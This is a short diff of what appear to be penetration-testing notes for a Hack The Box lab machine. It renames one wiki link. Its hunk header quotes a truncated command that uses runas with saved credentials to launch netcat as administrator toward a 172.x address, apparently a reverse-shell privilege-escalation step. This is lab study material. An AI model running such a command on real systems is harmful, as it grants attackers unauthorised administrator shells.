@@ -20,7 +20,7 @@ runas /env /noprofile /savecred /user:username\administrator "c:\temp\nc.exe 172
 - We can use `mdb-sql` and `readpst` tools to open and read `.mdb` and `.pst` files
 
 
-See HTB [[Access]]
+See HTB [[Access - HTB]]
 # Enumeration
 
 - Nmap
